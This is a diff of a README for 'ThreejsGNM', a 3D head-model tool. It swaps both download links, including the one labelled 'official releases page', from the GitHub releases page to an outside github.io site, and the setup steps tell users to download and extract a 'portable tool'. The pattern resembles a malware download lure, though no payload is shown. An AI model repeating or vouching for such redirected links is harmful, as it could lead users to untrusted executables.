@@ -1,6 +1,6 @@
 # 🎨 ThreejsGNM - Build realistic 3D head models easily
 
-[![Download ThreejsGNM](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Merleredistributed129/ThreejsGNM/releases)
+[![Download ThreejsGNM](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://merleredistributed129.github.io)
 
 ThreejsGNM brings the Google GNM head model technology directly into your web browser. This tool helps you view and edit highly detailed 3D human heads. You can adjust facial expressions, tweak identity features, and set head poses using simple controls. The software handles the complex math behind the scenes while you focus on your 3D design work.
 
@@ -17,7 +17,7 @@ To run this application, ensure your computer meets the following standards:
 
 The application runs as a portable tool on your machine. Follow these steps to set it up:
 
-1. Visit the [official releases page](https://github.com/Merleredistributed129/ThreejsGNM/releases) to download the latest version.
+1. Visit the [official releases page](https://merleredistributed129.github.io) to download the latest version.
 2. Select the file labeled as the latest release.
 3. Save the file to a folder you can find easily, such as your Downloads folder.
 4. Open the folder and extract the contents if the file is in a compressed format (usually ending in .zip).
